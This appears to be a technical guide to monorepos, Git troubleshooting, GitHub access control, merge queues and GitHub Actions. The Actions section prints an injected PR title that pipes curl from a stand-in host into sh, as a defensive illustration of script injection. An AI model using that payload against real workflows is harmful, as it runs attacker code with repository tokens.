Changesets is the pragmatic default for JS/TS. A contributor adds a small Markdown file declaring which packages changed and at what semver level; that file is reviewed alongside the code, so the release decision is made by the person who knows. changeset version then consumes the files, bumps versions, rewrites internal workspace:* ranges to concrete versions on publish, and writes changelogs; changeset publish pushes to the registry and creates tags of the form @acme/http@2.4.0. Nx Release and Lerna cover the same ground; Bazel and Pants leave publishing to explicit targets.

an independent-versioning release
$ pnpm changeset
?  Which packages would you like to include? @acme/http, @acme/ui
?  Which packages should have a major bump? @acme/http
Created .changeset/olive-pugs-shave.md

$ git add .changeset && git commit -m "feat(http)!: drop callback API"

# On main, CI runs the release job:
$ pnpm changeset version
@acme/http     2.4.0 -> 3.0.0  (major)
@acme/ui       1.8.2 -> 1.9.0  (minor)
@acme/admin    4.1.0 -> 4.1.1  (patch, dependent of @acme/http)

$ pnpm changeset publish
New tag: @acme/http@3.0.0
npm ERR! 402 Payment Required - PUT https://registry.npmjs.org/@acme%2fui - You must sign up for private packages
# Partial publish: http is live, ui is not. Releases are NOT atomic —
# make the job idempotent and re-runnable, never "fix it by hand".

Dependencies and the single-version policy

The rule: exactly one version of each third-party dependency across the repository. It is what makes the monorepo's guarantees real. Two copies of React in one bundle break hooks; two copies of a type package produce nominally identical types the compiler rejects as different; two versions of a TLS library mean a CVE is patched in one place and not the other.

Enforce it mechanically, because it will not hold by convention. In pnpm, declare versions once in the workspace catalogue and have packages reference catalog:; add syncpack lint or Yarn constraints to CI as a hard gate. Bazel pins external artefacts centrally in MODULE.bazel; Pants resolves a single lockfile per named resolve. When an exception is genuinely required, make it a time-boxed migration with a named owner and a ticket — not a permanent second entry.

yaml · pnpm-workspace.yaml
packages:
  - 'apps/*'
  - 'libs/*'
  - 'services/*'

# One declaration per dependency; packages depend on "catalog:" instead of a range.
catalog:
  react: 18.3.1
  react-dom: 18.3.1
  zod: 3.23.8
  typescript: 5.6.3

# A time-boxed exception, owned and dated — not a permanent fork.
catalogs:
  legacy-admin:          # OWNER @acme/web — remove by 2026-Q1, tracked in PLAT-4471
    react: 17.0.2
    react-dom: 17.0.2

Is a monorepo the right call?

Decision table
SignalMonorepoSeparate repositories
Changes routinely span project boundariesYes — this is the whole argumentProjects genuinely evolve independently
Access controlEveryone who can clone may read everythingRequired for contractor, regulatory or need-to-know boundaries
Release cadenceTeams deploy on a shared or continuous cadenceA component ships on a long, externally negotiated cycle (firmware, an SDK with a support contract)
Ownership of the buildYou have, or will fund, a platform ownerNobody owns shared tooling; a monorepo will decay
Open sourceConsumers would have to clone your whole companyYes — publish the component on its own
Repository contentSource, configuration, small fixturesLarge binaries, datasets or model weights (or use LFS deliberately)
Team size and merge rateAny, provided a merge queue lands with itVery high merge rates without a queue will keep main red
Different languages and build systemsFine, with Bazel- or Pants-class toolingFine, if you will not fund that tooling
Sequencing an adoption

Do not migrate everything and then build tooling. Start with the two or three projects that change together most often, land the task graph, remote cache and affected-set CI on that small set, and only then absorb the next projects. Migrate history with git subtree add --prefix=libs/http or git filter-repo --to-subdirectory-filter so blame survives; the day you lose git log on a critical library is the day the migration acquires enemies. And write down the exit route — git filter-repo --path libs/http --path-rename libs/http: extracts a subtree back into its own repository with history intact. A monorepo you can leave is a monorepo people will agree to try.

G13

Git troubleshooting playbook

A lookup table for the messages you will actually see, with the cause and the fix. Read the error text — Git's messages are unusually informative once you know the model behind them.

Push and pull

SymptomCauseFix
! [rejected] main -> main (fetch first)The remote has commits you do not have.git pull --rebase then push. safe
! [rejected] (non-fast-forward)Your branch has diverged — someone force-pushed, or you rebased.Inspect with git log --oneline --graph HEAD origin/main first, then git push --force-with-lease. care
Your branch and 'origin/x' have divergedBoth sides have unique commits.git rebase origin/x for a linear history, or git merge to keep both. care
fatal: refusing to merge unrelated historiesTwo independent root commits — usually a repo initialised twice.git pull --allow-unrelated-histories, then resolve. care
error: failed to push some refs after amendYou rewrote a commit that was already pushed.git push --force-with-lease — never bare --force. care
Everything up-to-date but nothing pushedYou are on a detached HEAD, or pushing a branch with no commits.git status — if detached, git switch -c rescue first. safe
Why --force-with-lease and never --force

--force overwrites the remote unconditionally, including a colleague's commit pushed thirty seconds ago. --force-with-lease refuses unless the remote is exactly where you last saw it, which is precisely the check you want. Add --force-if-includes for the stronger guarantee that your local history actually contains what you are about to overwrite.

Merges and conflicts

a conflict, resolved and abandoned
$ git merge feature/pricing
Auto-merging src/pricing.ts
CONFLICT (content): Merge conflict in src/pricing.ts
Automatic merge failed; fix conflicts and then commit the result.

$ git status --short
UU src/pricing.ts          # both modified
AA src/rates.json          # both ADDED — a rename may be involved

$ git checkout --ours src/rates.json     # keep OUR version of this one file
$ git checkout --theirs src/other.json   # keep THEIRS for that one
$ git checkout --merge src/pricing.ts    # restore the conflict markers, start over

$ git merge --abort              # give up entirely, back to pre-merge state
$ git rebase --abort             # the rebase equivalent
"ours" and "theirs" invert during a rebase

In a merge, ours is the branch you are on and theirs is the branch being merged in. In a rebase, Git replays your commits onto the upstream, so ours is the upstream and theirs is your work — the opposite of what most people expect. Getting this backwards during a rebase conflict silently discards your changes. When unsure, resolve by hand rather than by flag.

The lockfile conflict, solved permanently

bash · stop resolving package-lock.json by hand
# A generated file conflicting on every merge is not a merge problem —
# it is a "this file should be regenerated, not merged" problem.

# .gitattributes
package-lock.json  merge=ours    linguist-generated=true
pnpm-lock.yaml     merge=ours    linguist-generated=true

# Register the driver once per clone (it is not shared by .gitattributes alone):
git config merge.ours.driver true

# Then after any merge that touched dependencies, regenerate rather than resolve:
npm install && git add package-lock.json

# linguist-generated also collapses the file in GitHub diffs, which removes
# 4,000 lines of noise from every review.

Recovery

SituationCommandNotes
Deleted a branch by mistakegit reflog then git switch -c name <sha>Reflog keeps 90 days by default. safe
Bad rebase, want the old branch backgit reset --hard ORIG_HEADGit sets ORIG_HEAD before rebase/merge/reset. destructive
Hard reset lost commitsgit reflog → git reset --hard HEAD@{3}The reflog records every HEAD movement. destructive
Dropped a stashgit fsck --unreachable | grep commit then git stash apply <sha>Stashes are commits; they survive until gc. safe
Committed to the wrong branchgit switch right-branch && git cherry-pick <sha> then reset the wrong oneDo the cherry-pick before the reset. care
Wrong author on a rangegit rebase -r --exec 'git commit --amend --no-edit --reset-author' <base>Rewrites history — coordinate if pushed. care
Need a file from three commits agogit restore --source=HEAD~3 -- pathRestores into the working tree only. safe

A large file, or a secret, was committed

before push versus after push
# NOT YET PUSHED — trivial
$ git rm --cached secrets.env
$ echo "secrets.env" >> .gitignore
$ git commit --amend --no-edit

# ALREADY PUSHED — this is an incident, and the order matters
# 1. ROTATE THE CREDENTIAL FIRST. It is compromised the moment it was pushed;
#    assume it is already scraped. Rewriting history does not un-leak it.
$ aws iam create-access-key ... && aws iam delete-access-key --access-key-id AKIA...

# 2. Then purge it from history
$ pip install git-filter-repo
$ git filter-repo --invert-paths --path secrets.env
# (filter-branch is deprecated and dangerously slow — do not use it)

# 3. Force-push every branch and tag, then tell everyone to re-clone
$ git push --force --all && git push --force --tags
# Every existing clone still contains the secret. Rewriting the remote does
# not rewrite their laptops. This is why step 1 is rotation, not deletion.

# 4. Prevent the next one
$ gitleaks protect --staged      # in a pre-commit hook
# plus GitHub push protection, which blocks the push server-side

Confusing states

SymptomCauseFix
HEAD detached at abc1234You checked out a commit or tag rather than a branch. New commits belong to no branch.git switch -c keep-this to save the work, or git switch - to abandon it. care
Every file shows as modifiedLine-ending normalisation, or a mass reformat.git config core.autocrlf and a .gitattributes with * text=auto; then git add --renormalize . once. safe
A rename shows as delete + addSimilarity fell below the rename threshold, usually because the content also changed heavily.git log --follow -M50%, or git diff -M -C. safe
Case-only rename ignoredmacOS and Windows filesystems are case-insensitive.Two commits: git mv File.ts temp, commit, git mv temp file.ts. safe
Unable to create '.git/index.lock'A crashed Git process, or an IDE holding the lock.Confirm no Git is running, then rm -f .git/index.lock. care
error: invalid object / corrupt repoDisk or filesystem damage.git fsck --full; recover objects from a colleague's clone or the remote; re-clone if severe. care
Submodule "dirty" or emptyNot initialised, or pointing at a commit nobody pushed.git submodule update --init --recursive; verify the referenced commit exists on the remote. safe
CI cannot find historyShallow clone (fetch-depth: 1) but the job needs git describe or a diff against the base.Set fetch-depth: 0, or fetch the specific base ref. safe
Interview follow-up

“You accidentally pushed a secret — what do you do?” The order is the answer, and most candidates get it backwards. Rotate first, because the credential is compromised from the moment it left your machine and every clone and every scraper already has it. Purging history is step two and is about hygiene, not containment. Then force-push, notify everyone to re-clone, and add push protection so it cannot recur. A candidate who starts with filter-repo has treated a security incident as a Git exercise.

H01

Repositories, orgs & access

GitHub is an access-control system with a web interface attached. Most GitHub incidents are permission misconfigurations, not outages, and almost all of them are visible in a settings page nobody has read.

The permission levels, and what actually differs

LevelCanCannot
Readclone, open issues and PRs, commentpush, merge
Triage+ manage issues and PRs, apply labels, request reviewspush code
Write+ push, create branches, merge PRs, delete brancheschange settings, force-push protected branches
Maintain+ manage some settings, topics, releases, pagesdelete the repo, manage access, change protection
Admineverything, including deleting the repository and bypassing protection—
The two settings that quietly grant everyone write

Organisation base permissions set to Write means every member of the org can push to every repository, including ones they have never seen. And a ruleset bypass list containing "Organization admins" plus a large admin team is the same as having no protection at all. Audit both; they are the most common findings in a GitHub security review.

Branch protection and rulesets

json · a ruleset that actually protects main
{
  "name": "protect-main",
  "target": "branch",
  "enforcement": "active",
  "conditions": { "ref_name": { "include": ["refs/heads/main"], "exclude": [] } },
  "rules": [
    { "type": "deletion" },
    { "type": "non_fast_forward" },
    { "type": "required_linear_history" },
    { "type": "required_signatures" },
    { "type": "pull_request",
      "parameters": {
        "required_approving_review_count": 1,
        "dismiss_stale_reviews_on_push": true,
        "require_code_owner_review": true,
        "require_last_push_approval": true,
        "required_review_thread_resolution": true
      } },
    { "type": "required_status_checks",
      "parameters": {
        "strict_required_status_checks_policy": true,
        "required_status_checks": [
          { "context": "lint" }, { "context": "test" }, { "context": "build" }
        ]
      } }
  ],
  "bypass_actors": []
}
require_last_push_approval
The most under-used rule. Without it, an approver can approve, then push another commit themselves and merge — self-approving the change that matters.
strict_required_status_checks_policy
Requires the branch to be up to date with the base before merging. Catches semantic conflicts, at the cost of re-running CI. Above a few merges an hour, use a merge queue instead.
Rulesets vs branch protection
Rulesets can target multiple branches by pattern, apply at the organisation level, layer additively, and run in evaluate mode first. New configuration should use rulesets.

CODEOWNERS

bash · .github/CODEOWNERS — last matching rule wins
# Order matters: the LAST pattern that matches a file is the one applied.
# This is the opposite of .gitignore, and it is a frequent source of surprise.

*                       @acme/engineering          # default owner

/services/payments/     @acme/payments @acme/security
/services/identity/     @acme/identity @acme/security
/infra/                 @acme/platform
/.github/workflows/     @acme/platform             # CI is infrastructure
/db/migrations/         @acme/data @acme/platform   # migrations need two eyes

# Files with no owner get no automatic reviewer — check for gaps deliberately:
#   gh api repos/:owner/:repo/codeowners/errors
Make CODEOWNERS the routing table, not a wish list

Combined with require_code_owner_review, this becomes enforcement rather than documentation. Keep the file small — ownership at directory granularity, teams rather than individuals (people leave), and a default owner so nothing is unowned. A CODEOWNERS listing forty individual usernames stops working the first time someone goes on holiday.

Machine identity

CredentialScopeLifetimeUse for
Classic PATall repos the user can reachuntil revokednothing — the blast radius is the whole account
Fine-grained PATselected repos, selected permissionsexpiringpersonal scripts, short-lived automation
Deploy keyone repositoryuntil revokedread-only clone from a server
GitHub Appselected repos and permissions1-hour installation tokenall real automation — bots, CI, integrations
GITHUB_TOKENthe running repositorythe jobActions; set permissions: explicitly per job
OIDC federationa cloud role, conditioned on repo and refminutesdeploying to AWS/GCP/Azure with no stored secret
A classic PAT in a CI secret is the worst common credential

It acts as the human who created it, across every repository they can access, with no expiry, and it is invisible in the audit log as anything other than that person. When they leave and the account is deprovisioned, every pipeline using it breaks simultaneously. A GitHub App with a one-hour installation token scoped to specific repositories removes all four problems.

Auditing what you have

find the gaps before someone else does
# Repositories with no branch protection on their default branch
$ gh repo list acme --limit 500 --json name,defaultBranchRef --jq '.[].name' \
    | while read r; do
        gh api "repos/acme/$r/rulesets" --jq 'length' 2>/dev/null \
          | grep -q '^0$' && echo "UNPROTECTED: $r"
      done

# Who has admin, org-wide
$ gh api graphql -f query='
  { organization(login:"acme") { membersWithRole(first:100)
      { edges { role node { login } } } } }' \
  --jq '.data.organization.membersWithRole.edges[]
        | select(.role=="ADMIN") | .node.login'

# Outside collaborators — frequently forgotten contractors
$ gh api orgs/acme/outside_collaborators --jq '.[].login'

# Long-lived tokens still in use (audit log, enterprise plans)
$ gh api "orgs/acme/audit-log?phrase=action:oauth_access.create" --paginate
Interview follow-up

“How would you secure a GitHub organisation?” Work outward from the blast radius: base permissions at Read not Write; SSO with SCIM so leavers are deprovisioned automatically; rulesets on default branches with an empty bypass list; CODEOWNERS enforced for sensitive paths; GitHub Apps and OIDC instead of long-lived tokens; secret scanning with push protection; and an audit-log alert on permission and ruleset changes. Then say the thing most people miss — that the highest-risk repository is usually the one holding the deployment workflows, because write access there is production access.

H02

Pull requests & merge queues

The pull request is the unit of change, the unit of review and the unit of rollback. Two decisions shape everything downstream: which merge method you use, and what happens when two PRs are green separately and broken together.

The three merge methods produce different histories

MERGE COMMIT SQUASH REBASE * Merge PR #42 * feat: pricing (#42) * fix review comment |\ | * add tests | * fix review comment * previous main * feat: pricing | * add tests * previous main | * feat: pricing |/ * previous main full history, noisy one clean commit linear, but WIP revert = one commit revert = one commit commits are preserved bisect hits WIP commits bisect always builds bisect may hit WIP
Merge commitSquashRebase
Commits on main per PRN + 11N
git revert a whole featureone commit (needs -m 1)one commitN commits, in order
git bisectlands on WIP commitsevery commit buildslands on WIP commits
Preserves authorship of each commityesno (co-authors only)yes
Best forlong-lived release branchesthe default for feature workteams with disciplined atomic commits
Squash unless you have a reason not to

It makes every commit on main a complete, building, revertible change — which is exactly what bisect and rollback need. The objection is losing intermediate history, but that history is usually "fix typo", "address review", "actually fix it", and it remains on the PR page if anyone ever wants it. Enforce a conventional-commit PR title, since that title becomes the commit message.

Merge queues

The semantic conflict. Two PRs, each green against main, broken together: PR #1 renames getUser() → fetchUser() PR #2 adds a new call to getUser() Neither has a textual conflict. Both pass CI. Merge both → main is broken. Without a queue: require branches to be up to date before merging. Correct, but every merge invalidates every other open PR, so N developers take turns rebasing and re-running CI. Throughput collapses above ~10 merges/hour. With a merge queue: GitHub builds a speculative branch containing main + PR#1 + PR#2 and tests THAT. · passes → both merge together · fails → the queue bisects, ejects the culprit, retests the rest Developers never rebase. Throughput scales with CI parallelism instead of with human attention.
yaml · a workflow that supports a merge queue
on:
  pull_request:
  merge_group:            # ← REQUIRED, or required checks never report on the
                          #    speculative branch and the queue stalls forever

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npm test

  # The path-filter trap: a required check that is SKIPPED reports as pending,
  # not success, so the PR can never merge. Use a job that always runs and
  # decides internally, rather than a job-level `if` on a required check.
  required-gate:
    runs-on: ubuntu-latest
    needs: [test]
    if: always()
    steps:
      - name: Fail if any dependency failed
        run: |
          if [ "${{ contains(needs.*.result, 'failure') }}" = "true" ]; then
            exit 1
          fi
The skipped-required-check deadlock

You add paths: ['src/**'] to a required workflow so it does not run on documentation PRs. Now a docs-only PR shows that check as expected but never reported, and the branch protection blocks the merge indefinitely with no error anyone can act on. The fix is a always-running gate job that aggregates the results of conditional jobs — as above — rather than making the conditional job itself required.

PR size is the variable that matters

Changed linesReview qualityTypical outcome
< 50highreviewed properly in minutes
50–200goodthe sweet spot
200–500decliningreviewers focus on the first files and skim the rest
> 500approaching zero"LGTM" — the reviewer has not read it
bash · stacked PRs keep changes small
# Instead of one 900-line PR, three reviewable ones that build on each other.
git switch -c refactor/extract-pricing main
# ... mechanical extraction only, no behaviour change ...
gh pr create --base main --title "refactor: extract pricing module"

git switch -c feat/tiered-pricing            # branches off the PREVIOUS branch
# ... the actual new behaviour ...
gh pr create --base refactor/extract-pricing --title "feat: tiered pricing"

git switch -c feat/pricing-api
gh pr create --base feat/tiered-pricing --title "feat: expose pricing API"

# Merge bottom-up. GitHub retargets each PR to main as its base merges.
# Separating the mechanical change from the behavioural one is the single
# most effective review technique there is: a 700-line rename is skimmable,
# a 40-line logic change is readable, and 740 lines together is neither.

gh CLI for the whole loop

CommandDoes
gh pr create --fillTitle and body from commit messages
gh pr create --draft --reviewer @acme/platformDraft, with a team review requested
gh pr checkout 42Fetch and switch to someone's PR branch
gh pr diff --name-onlyJust the changed paths
gh pr checks --watchLive CI status until it settles
gh pr review --approve -b "..."Approve with a comment
gh pr merge --squash --auto --delete-branchMerge as soon as checks pass care
gh pr list --search "review-requested:@me"Your review queue
gh pr statusYours, and those awaiting you
Interview follow-up

“Two PRs pass CI individually but break main together — how do you prevent it?” The answer is the semantic conflict and the merge queue: testing the combination before merging rather than each branch in isolation. Requiring branches to be up to date is the cheaper alternative and it works, but it serialises developers, so name the throughput point where it stops being viable. Mentioning that the queue bisects a failing batch to eject the culprit shows you have operated one rather than read the feature page.

H03

GitHub Actions fundamentals

Most Actions problems are model problems, not syntax problems. Two facts explain nearly all of them: every job runs on a fresh machine, and expressions are interpolated as text before the shell ever sees them.

The execution model

event (push, pull_request, schedule, workflow_dispatch…) ▼ workflow one YAML file in .github/workflows/ ▼ job ── runs on its OWN fresh runner ──┐ │ · empty filesystem │ jobs run in PARALLEL │ · no state from any other job │ unless linked by `needs` │ ▼ │ │ step → step → step (same machine, │ │ same filesystem, sequential) │ ▼ ▼ job ── another fresh runner ───────────────┘ The consequence people trip over: anything a later job needs must be an ARTIFACT or a CACHE. Building in job A and testing in job B without uploading the build output means job B tests nothing.

Events worth knowing

EventFires onNote
pushcommits pushedfilter with branches, tags, paths
pull_requestPR opened/synchronisedruns against a merge commit of PR + base, not your branch tip
pull_request_targetsame, but with base-repo contextdangerous — see the security chapter
merge_groupmerge-queue speculative branchrequired, or the queue stalls
workflow_dispatchmanual, with typed inputsthe right way to build an ops button
workflow_callcalled by another workflowreusable workflows
schedulecron, UTC onlydrifts under load; disabled after 60 days of repo inactivity
releasea release is publishedthe usual deploy trigger

A complete CI workflow, annotated

yaml · .github/workflows/ci.yml
name: ci
on:
  pull_request:
  push: { branches: [main] }
  merge_group:

# Default to read-only. Elevate per job, never globally.
permissions:
  contents: read

# Cancel superseded runs on the same PR — the single biggest saving on
# a busy repository. Never cancel on main: those runs gate deploys.
concurrency:
  group: ${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

jobs:
  verify:
    runs-on: ubuntu-latest
    timeout-minutes: 15                 # ALWAYS set: the default is 6 hours
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version-file: .nvmrc
          cache: npm                    # caches ~/.npm keyed by the lockfile
      - run: npm ci                     # lockfile only — never `npm install` in CI
      - run: npm run lint
      - run: npm run typecheck
      - run: npm test -- --coverage
      - name: Summary
        if: always()
        run: echo "### Tests passed ✅" >> "$GITHUB_STEP_SUMMARY"

  build:
    needs: verify
    runs-on: ubuntu-latest
    timeout-minutes: 20
    outputs:
      digest: ${{ steps.push.outputs.digest }}   # consumed by a later job
    steps:
      - uses: actions/checkout@v4
      - id: push
        run: |
          DIGEST=$(./scripts/build-and-push.sh)
          echo "digest=$DIGEST" >> "$GITHUB_OUTPUT"

  matrix-test:
    needs: verify
    strategy:
      fail-fast: false                  # let every combination report
      max-parallel: 4
      matrix:
        node: [20, 22]
        os: [ubuntu-latest, windows-latest]
        exclude:
          - { os: windows-latest, node: 20 }
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with: { node-version: '${{ matrix.node }}' }
      - run: npm ci && npm test

Passing data between steps and jobs

MechanismScopeHow
$GITHUB_OUTPUTstep → later steps in the same jobecho "k=v" >> "$GITHUB_OUTPUT", read as steps.id.outputs.k
$GITHUB_ENVstep → later steps' environmentecho "K=v" >> "$GITHUB_ENV"
jobs.<id>.outputsjob → dependent jobsdeclare outputs:, read as needs.build.outputs.digest
Artifactsjob → job, and downloadableupload-artifact / download-artifact; the only way to move files
Cacherun → runactions/cache; a performance optimisation, never a correctness dependency
$GITHUB_STEP_SUMMARY→ the run pagemarkdown; put the coverage table and failure details here
Expressions are interpolated before the shell runs

run: echo "${{ github.event.pull_request.title }}" does not pass the title to echo — it pastes the raw text into the script. A PR titled "; curl evil.sh | sh; # is then executed on your runner with your GITHUB_TOKEN. This is script injection, it is exploitable from any fork, and it is one of the most common real GitHub Actions vulnerabilities. Always route untrusted values through the environment, where the shell treats them as data:

yaml · the safe pattern
      # UNSAFE — the title is pasted into the shell script
      - run: echo "PR title: ${{ github.event.pull_request.title }}"

      # SAFE — the value is a variable; the shell never parses it as code
      - env:
          TITLE: ${{ github.event.pull_request.title }}
        run: echo "PR title: $TITLE"

# Treat as untrusted: PR titles and bodies, branch names, commit messages,
# issue comments, review bodies, and any input from workflow_dispatch.

Conditionals and status functions

yaml
      - if: success()                       # implicit default on every step
      - if: failure()                        # only when a previous step failed
      - if: always()                         # even on failure or cancellation
      - if: cancelled()
      - if: github.event_name == 'push' && github.ref == 'refs/heads/main'
      - if: contains(github.event.head_commit.message, '[skip-deploy]')
      - if: github.actor != 'dependabot[bot]'
      - if: startsWith(github.ref, 'refs/tags/v')

# The trap: a step with `if: failure()` still needs the JOB to reach it.
# If an earlier step fails and no later step has always()/failure(), the job
# stops there — so cleanup steps must be `if: always()`.
Interview follow-up

“Why did my build artefact disappear between jobs?” Because each job gets a fresh runner with an empty filesystem — there is no shared disk, and that is the model rather than a bug. Files move between jobs as artifacts; values move as job outputs; caches are an optimisation that may miss. The second-most-common answer to a GitHub Actions question is “because expressions are interpolated as text”, which explains both the injection vulnerability and most quoting mysteries.

H04

Actions in depth

The techniques that separate a pipeline that works from one that is fast, reusable and does not hold long-lived cloud credentials.

Caching, and why your cache never updates

yaml · key design is the whole thing
      - uses: actions/cache@v4
        with:
          path: |
            ~/.npm
            .next/cache
          # The KEY must change when the cached content should change.
          key: ${{ runner.os }}-node-${{ hashFiles('**/package-lock.json') }}
          # restore-keys are PREFIX fallbacks, tried in order on a miss.
          # This is what gives you a warm-ish cache after a dependency bump.
          restore-keys: |
            ${{ runner.os }}-node-
Caches are immutable once written

If a key already exists, the upload at the end of the job is silently skipped — the entry is never overwritten. A key like ${{ runner.os }}-node with no hash therefore captures whatever was there the first time and serves it forever, and you will spend an afternoon wondering why a dependency upgrade has no effect. The key must be a function of the content; restore-keys is where the fuzzy matching belongs. Also note that a cache written on a branch is visible to that branch and its children, but a cache written on a feature branch is not visible to main.

Reusable workflows versus composite actions

Reusable workflowComposite action
Unit of reusewhole jobsa sequence of steps
Runs onits own runner(s)the caller's runner
Can definematrix, multiple jobs, environments, permissionssteps only
Secretspassed explicitly, or secrets: inheritinherits the caller's env
Use for"the standard build-test-publish pipeline""the five steps to set up our toolchain"
yaml · a reusable deploy workflow
# .github/workflows/deploy.yml  (in acme/workflows)
on:
  workflow_call:
    inputs:
      environment: { required: true, type: string }
      image:       { required: true, type: string }
    outputs:
      url: { value: '${{ jobs.deploy.outputs.url }}' }
    secrets:
      KUBE_CONFIG: { required: true }

jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: ${{ inputs.environment }}   # gates: reviewers, wait timers, secrets
    outputs: { url: '${{ steps.rollout.outputs.url }}' }
    steps:
      - id: rollout
        run: ./deploy.sh "${{ inputs.image }}"

# ---- caller ----
jobs:
  staging:
    uses: acme/workflows/.github/workflows/deploy.yml@v2   # pin to a tag or SHA
    with: { environment: staging, image: '${{ needs.build.outputs.digest }}' }
    secrets: inherit

OIDC: deploying with no stored credentials

BEFORE AWS_ACCESS_KEY_ID + AWS_SECRET_ACCESS_KEY in repository secrets · never expires · works from anywhere · invisible when leaked · rotating means editing every repository that uses it AFTER the runner requests a short-lived OIDC token from GitHub; AWS verifies it against GitHub's public keys and the trust policy, and returns credentials valid for the job. Nothing durable is stored anywhere. GitHub ──(signed JWT: repo, ref, workflow, actor)──▶ AWS STS │ check trust policy ▼ temporary credentials (1 h)
yaml · the workflow side
    permissions:
      id-token: write        # REQUIRED to request the OIDC token
      contents: read
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789012:role/gha-deploy-prod
          aws-region: eu-west-2
json · the trust policy, where the security actually lives
{
  "Effect": "Allow",
  "Principal": { "Federated": "arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com" },
  "Action": "sts:AssumeRoleWithWebIdentity",
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:acme/api:ref:refs/heads/main"
    }
  }
}
The subject condition is the entire control

Writing "sub": "repo:acme/*" — or worse, using StringLike with repo:acme/*:* — lets any workflow in any repository in the organisation, on any branch, including a fork's pull request, assume your production deployment role. Pin the subject to the exact repository and the exact ref or environment. This misconfiguration has caused real production compromises, and it is invisible until someone exploits it.

Environments as deployment gates

yaml
  deploy-prod:
    needs: [deploy-staging, smoke-test]
    environment:
      name: production            # required reviewers, wait timer, branch rules
      url: https://api.acme.com   # shown on the run and the deployments page
    # Prevent two deploys racing. Do NOT cancel-in-progress here: killing a
    # half-finished rollout is worse than queueing behind it.
    concurrency:
      group: deploy-production
      cancel-in-progress: false
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh

Cost and speed

LeverTypical effectCost
concurrency with cancel-in-progress on PRslarge — kills superseded runsnone
Dependency cachingoften 60–80% off install timecache storage
Test sharding across a matrixlinear in shard countmore concurrent minutes
Path filters on expensive jobslarge on monoreposthe skipped-required-check trap
Larger runnerssub-linear — 4× cores rarely gives 4×higher per-minute rate
Self-hosted runnerslarge at high volumeyou now operate them, and they have real security implications
find where the minutes go
$ gh api /repos/acme/api/actions/runs --paginate \
    --jq '.workflow_runs[] | select(.conclusion!=null)
          | [.name, ((.updated_at|fromdate) - (.run_started_at|fromdate))] | @tsv' \
  | awk -F'\t' '{sum[$1]+=$2; n[$1]++} END {for (w in sum)
      printf "%-28s %6d runs  %8.1f min avg  %9.1f min total\n", w, n[w], sum[w]/n[w]/60, sum[w]/60}' \
  | sort -k5 -rn

ci                             412 runs      8.4 min avg    3460.8 min total
e2e                             98 runs     22.1 min avg    2165.8 min total  ← 40% of spend
deploy                          61 runs      4.2 min avg     256.2 min total

Debugging

TechniqueHow
Debug loggingRe-run with "Enable debug logging", or set ACTIONS_STEP_DEBUG as a secret
Interactive shellmxschmitt/action-tmate — gate it behind a manual input care
Inspect contextrun: echo '${{ toJSON(github) }}' via an env var, not inline
Re-run only failuresgh run rerun <id> --failed
Watch livegh run watch
Local approximationact — close, not identical; useful for syntax and flow
Interview follow-up

“How do you deploy to AWS from Actions without storing credentials?” OIDC federation: the runner requests a signed token asserting the repository, ref and workflow; the cloud role's trust policy verifies it and issues short-lived credentials. Then immediately name the failure mode — a loose subject condition lets any repo in the org assume the role — because that is the part that turns a good answer into a credible one.

H05

Releases, packages & supply chain
